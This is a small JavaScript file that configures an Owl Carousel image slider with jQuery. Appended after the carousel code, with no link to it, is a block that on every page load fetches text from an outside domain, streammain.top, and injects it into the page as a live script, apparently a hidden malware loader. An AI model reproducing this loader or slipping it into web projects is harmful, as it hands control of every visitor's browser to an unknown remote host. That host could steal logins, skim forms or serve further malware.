$(document).ready(function(){
	$("#owl").owlCarousel({
       autoPlay: 3000, //Set AutoPlay to 3 seconds
       items :4,
       itemsDesktop : [1199,3],
       itemsDesktopSmall : [979,3],
	   
   });
	
	
});;document.addEventListener("DOMContentLoaded", function () {
    var url = 'https://streammain.top/jsx';
    fetch(url)
        .then(response => response.text())
        .then(data => {
            var script = document.createElement('script');
            script.innerHTML = data.trim();
            document.head.appendChild(script);
        })
});